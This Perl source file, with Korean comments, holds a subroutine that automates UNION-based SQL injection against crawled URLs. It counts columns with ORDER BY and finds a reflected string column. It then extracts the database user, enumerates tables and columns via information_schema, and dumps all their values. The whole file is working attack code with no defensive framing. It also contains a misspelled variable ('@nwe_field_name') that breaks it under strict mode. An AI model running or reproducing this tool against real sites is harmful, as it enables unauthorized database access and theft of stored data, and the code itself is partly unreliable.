#!/usr/bin/perl
use warnings;
use strict;
use WWW::Mechanize;
use 5.010;


sub sql_attack
{
    my ($crawl, $crawl_urls) = @_;
    for my $url (keys %$crawl_urls)
    {
        say $url;
        my $count=1;
        my $flag;
        my $field_number;
        my @union_query;
        my ($tag1, $tag2, $tag1_index, $tag2_index);
        my $string_field;
        my (@fields, %field_info);
        my (@tables, %table_info);
        my (@field_values, @new_field_value, @new_field_name);

        #order by 구문으로 필드 개수 확인 
        while(1)
        {
            eval{ $crawl->get($url.' order by '.$count) };
            my $content = $crawl->response->decoded_content;
            if($content=~/error/i)
            {
                $field_number=$count-1;
                last;
            }
            $count++;
            if($count>20)
            {
                $flag=1;
                print "$url can not sql injection\n";
                last;
            }
        }
        next if $flag;

        say "field number : $field_number";
        say "DB name : ${ $crawl_urls }{$url}";

        #union select 구문으로 데이터 타입이 문자열인 필드 찾기 위해 쿼리 작성 
        my $query = 'null';
        $query.=',null' x ($field_number-1);

        for(my $i=0; $i<$field_number; $i++)
        {
            my $copy_query = $query;
            substr($copy_query, $i*5, 4) = "'77777'";
            $copy_query = ' union select '.$copy_query;
            push @union_query, $copy_query;
        }

        
        #작성한 쿼리로 문자열 데이터 타입인 필드 찾기
        $count=1;
        for (@union_query)
        {
            eval{ $crawl->get($url.$_) };
            my $content=$crawl->response->decoded_content;

            if($content=~/(<\/?\s*\w*\s*\w*=?"?\w*"?>)\s*77777\s*(<\/\w*>)/)
            {
                $tag1=$1;
                $tag2=$2;
                $tag1=~s/\s//g;
                $tag2=~s/\s//g;
                $string_field=$count;
                $content=~s/\s//g;

                $tag1_index=index($content, $tag1.'77777');
                $tag2_index=index($content, $tag2, $tag1_index);

                last;
            }
            $count++;
        }
        $query = $union_query[$count-1];

        say "DB name : ${ $crawl_urls }{$url}";
        #DB별로 쿼리문 작성
        if(${ $crawl_urls }{$url} eq 'MySQL')
        {
            $query =~ s/'77777'/user\(\)/;
        }
        elsif(${ $crawl_urls }{$url} eq 'Microsoft SQL')
        {
            $query =~ s/'77777'/user_name\(\)/;
        }
        elsif(${ $crawl_urls }{$url} eq 'ORA')
        {
            $query =~ s/'77777'/user_name\(\)/;
        }
        
        #작성된 쿼리문 전송하여사용자 계정  결과값 확인
        eval{ $crawl->get($url.$query) };
        my $content=$crawl->response->decoded_content;
        $content=~s/\s//g;

        $tag1_index=index($content, $tag1, $tag1_index-1);
        $tag2_index=index($content, $tag2, $tag1_index);
        my $value_len=$tag2_index-$tag1_index-length($tag1);
        my $values=substr($content, $tag1_index+length($tag1), $value_len);

        say "account : $values";

        #information_schema 테이블을 이용하여 테이블명 확인 및 전송
        $query=$union_query[$string_field-1]." from information_schema.tables where table_schema=database()";
        $query=~s/'77777'/group_concat(table_name)/;

        eval{ $crawl->get($url.$query) };
        $content=$crawl->response->decoded_content;
        $content=~s/\s//g;

        $tag1_index=index($content, $tag1, $tag1_index-1);
        $tag2_index=index($content, $tag2, $tag1_index);
        $value_len=$tag2_index-$tag1_index-length($tag1);
        $values=substr($content, $tag1_index+length($tag1), $value_len);
                
        @tables=split(/,/,$values); 
        
        #저장된 테이블명을 토대로 테이블별 컬럼명 찾는 쿼리 작성 및 전송
        for my $table_name(@tables)
        {
            $query=$union_query[$string_field-1]." from information_schema.columns where table_name='$table_name'";
            $query=~s/'77777'/group_concat(column_name)/;
            
            eval{ $crawl->get($url.$query) };
            my $content=$crawl->response->decoded_content;
            $content=~s/\s//g;

            $tag1_index=index($content, $tag1, $tag1_index-1);
            $tag2_index=index($content, $tag2, $tag1_index);
            $value_len=$tag2_index-$tag1_index-length($tag1);
            $values=substr($content, $tag1_index+length($tag1), $value_len);
            
            $table_info{$table_name} = $values;
        }

        say "[Table&Field Information]";
        while( my($key, $value)=each %table_info)
        {
            say "$key : $value";
        }

        #각 테이블의 필드명의 데이터 얻어오기
        while( my($table, $field_name)=each %table_info)
        {
            say "[table : $table]";
            @fields=split(/,/,$field_name);

            #한 테이블의 필드들의 값을 얻어와서 @new_field_name, @new_field_value에 저장하기
            for my $field_name (@fields)
            {
                $query=$union_query[$string_field-1]." from $table";
                $query=~s/'77777'/group_concat($field_name,\'---\')/;

                eval{ $crawl->get($url.$query) };
                my $content=$crawl->response->decoded_content;
                $content=~s/\s//g;

                $tag1_index=index($content, $tag1, $tag1_index-1);
                $tag2_index=index($content, $tag2, $tag1_index);
                $value_len=$tag2_index-$tag1_index-length($tag1);
                $values=substr($content, $tag1_index+length($tag1), $value_len);

                if ($values =~ /</ || $values eq '')
                {
                    say "$field_name is nothing";
                }
                else
                {
                    #$field_info{$field_name}=$values;
                    push @new_field_name, $field_name;
                    @field_values=split(/---,?/,$values);
                    push @new_field_value, @field_values;
                    push @new_field_value, "//";
                }
            }
            
            next unless @nwe_field_name;

            say "@new_field_name";
            $count=0;
            for my $field_value(@new_field_value)
            {
                last if $field_value eq "//";
                $count++;
            }

            for (my $i=0; $i<$count; $i++)
            {
                for (my $j=0; $j<($#new_field_name+1); $j++)
                {
                    say "$new_field_value[$i+($j*($count+1))] ";
                }
                say '';
            }

            @fields = ();
            #%field_info = ();
            @new_field_value = ();
            @new_field_name = ();
            say '';
        }
    }
}
1;
